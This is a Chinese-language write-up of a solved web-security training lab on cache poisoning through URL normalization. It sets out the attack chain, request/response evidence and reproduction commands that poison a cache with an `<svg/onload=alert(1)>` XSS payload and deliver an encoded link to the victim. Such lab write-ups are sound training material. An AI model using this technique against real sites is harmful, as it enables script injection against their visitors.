---
title: "lab-web-cache-poisoning-normalization"
links:
  - target: cache-poisoning-family
    relation: evidences
---

# lab-web-cache-poisoning-normalization

> evidences: [[cache-poisoning-family]]

- 题面:URL normalization(/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-normalization)
- 实例:https://0a0e00f904df729981d198d5001f0098.web-security-academy.net
- 判定目标:借缓存归一化投毒,使访客浏览器执行 `alert(1)`
- 状态:**solved**(横幅 `Congratulations, you solved the lab!`)

## 链

1. 任意未知路径回 **404 反射原始 path**:`<p>Not Found: <path></p>`(`Cache-Control: max-age=10`)。
   浏览器会把 `<`/`>` 编码成 `%3C`/`%3E`,故反射 `%3C…` 不执行 = “URL 编码挡住直用”。
2. **缓存键按解码后的 URL 归一化**:先发原始 `GET /a<b>c`(缓存 miss)后,
   请求 `GET /a%3Cb%3Ec` 命中同一条目(`X-Cache: hit`,body 含原始 `<b>`)。
3. 关键前提:请求须带**有效 session cookie**,否则 404 响应带 `Set-Cookie` → 不落缓存。
4. 投毒:`GET /<svg/onload=alert(1)>`(原始字节,带 `Cookie: session=…`)→ 缓存存下反射原始 payload 的 404。
5. 把**编码后**的 URL 交付访客:`POST /deliver-to-victim answer=<inst>/%3Csvg%2Fonload%3Dalert(1)%3E`
   → 访客浏览器请求 `%3C…` → 缓存归一化命中 → 返回 `<svg/onload=alert(1)>` → 执行。
6. `max-age=10`,故用 `raw_poison` 每 4s 续发原始请求保持条目存活到访客命中。

## 证据摘录

```
GET /a<b>c        (Cookie: session=…) -> 404, x-cache: miss, body "<p>Not Found: /a<b>c</p>"
GET /a%3Cb%3Ec    (Cookie: session=…) -> 404, x-cache: hit,  body 含原始 <b>
GET /%3Csvg%2Fonload%3Dalert(1)%3E -> x-cache: hit, body 含 <svg/onload=alert(1)>
POST /deliver-to-victim -> {"correct":true}
solved_check <inst> -> solved: true
```

## 复现命令

```
lab_launch launch DA7B121CFC61090ED5E7CECB6C6F31B595087C04EA02056591225CF659E72EEC --widget-source /web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-normalization --jar /tmp/b9-jar4.json
lab_http get "<inst>/" --jar /tmp/b9-jar4.json          # 取 session cookie
raw_poison "<inst>/" --request-line 'GET /<svg/onload=alert(1)> HTTP/1.1' --header 'Cookie: session=<SID>' --interval-secs 4 --count 200
lab_http post "<inst>/deliver-to-victim" --form 'answer=<inst>/%3Csvg%2Fonload%3Dalert(1)%3E' --jar /tmp/b9-jar4.json
solved_check "<inst>" --jar /tmp/b9-jar4.json
```

新件:`raw_poison`(字节级原始请求行循环续投,发 ureq 会重编码的原始 `<`/`>`;配合解码归一化的缓存)。
